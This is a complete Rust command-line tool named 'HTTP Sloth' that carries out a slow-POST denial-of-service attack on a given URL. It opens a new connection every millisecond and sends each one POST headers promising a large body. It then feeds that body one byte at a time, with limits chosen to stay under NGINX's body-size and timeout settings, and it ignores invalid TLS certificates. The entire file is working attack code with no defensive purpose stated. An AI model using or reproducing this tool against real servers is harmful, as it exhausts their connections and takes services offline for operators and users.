use std::io;
use std::io::Write;
use std::net::ToSocketAddrs;
use std::cell::RefCell;
use std::rc::Rc;
use std::time::Duration;

#[macro_use]
extern crate clap;
use clap::{Arg, App};

extern crate futures;
use futures::*;

extern crate native_tls;

extern crate tokio_core;
use tokio_core::reactor::Core;
use tokio_core::net::TcpStream;

extern crate tokio_timer;
use tokio_timer::*;

extern crate tokio_tls;
use tokio_tls::TlsConnector;

extern crate url;
use url::Url;

mod stream;
use stream::MaybeHttpsStream;

type BoxedMaybeHttps = Box<Future<Item = MaybeHttpsStream, Error = io::Error>>;

fn main() {
    let arguments = App::new("HTTP Sloth")
        .arg(Arg::with_name("url")
             .long("url")
             .value_name("URL")
             .help("Target URL.")
             .required(true))
        .arg(Arg::with_name("content-length")
             .long("content-length")
             .value_name("BYTES")
             .help("Content-Length request header. Must be less than client_max_body_size (NGINX)"))
        .arg(Arg::with_name("interval")
             .value_name("SECONDS")
             .long("interval")
             .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
        .get_matches();

    let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
    let needs_tls = match parsed_url.scheme() {
        "https" => true,
        _ => false
    };
    let host = parsed_url.host_str().unwrap().to_owned();
    let path = parsed_url.path();
    let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
    let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));

    let mut core = Core::new().unwrap();
    let handle = core.handle();
    let loop_handle = handle.clone();

    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let addr = parsed_url.to_socket_addrs().unwrap().next().unwrap();
    let mut tls_connector = native_tls::TlsConnector::builder();
    tls_connector.danger_accept_invalid_certs(true);
    let tls_connector = tls_connector.build().unwrap();

    let live_connections = Rc::new(RefCell::new(0usize));
    let track_live_connections = live_connections.clone();
    let connection_number = Rc::new(RefCell::new(0usize));
    let cycle = Interval::new_interval(Duration::from_millis(1)).for_each(move |_| {
        *connection_number.borrow_mut() += 1;
        let connection_number = *connection_number.borrow();
        let host = host.clone();
        let start = start.clone();
        let tls_connector = tls_connector.clone();
        let tls_connector = TlsConnector::from(tls_connector);

        let socket = TcpStream::connect(&addr, &handle);
        let connector: BoxedMaybeHttps = if needs_tls {
            Box::new(socket.and_then(move |socket| {
                tls_connector
                    .connect(&host, socket)
                    .map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("TLS connector error: {}", e)) })
            }).map(MaybeHttpsStream::Https))
        } else {
            Box::new(socket.map(MaybeHttpsStream::Http))
        };

        let connection = connector
            .and_then(move |mut socket| {
                let _start_written = socket.write(start.as_bytes());
                let _start_flushed = socket.flush();
                println!("Stream number: {} spawned.", connection_number);
                Ok(socket)
            })
            .and_then(move |mut socket|{
                Interval::new_interval(interval).for_each(move |_| {
                    let _byte_written = socket.write(b"a");
                    let _byte_flushed = socket.flush();
                    println!("Stream number: {} written.", connection_number);
                    Ok(())
                }).map_err(|e| { io::Error::new(io::ErrorKind::Other, format!("Timer error: {}", e)) })
            });
        let live_connections = live_connections.clone();
        *live_connections.borrow_mut() += 1;
        handle.spawn(connection.map_err(move |e| {
            *live_connections.borrow_mut() -= 1;
            println!("Connection: {} failed! Reason: {}", connection_number, e);
        }));
        Ok(())
    });

    loop_handle.spawn(cycle.map_err(move |e| println!("Cannot spawn connections cycle loop. Reason: {}", e)));
    let print_interval = Duration::from_secs(5);
    loop_handle.spawn(
        Interval::new_interval(print_interval).for_each(move |_| {
            println!("Live Connections: {}", track_live_connections.borrow());
            Ok(())
        })
        .map_err(move |e| println!("Cannot spawn live connetions print task. Reason: {}", e))
    );
    let empty: futures::Empty<(), ()> = future::empty();
    let _core_started = core.run(empty);
}
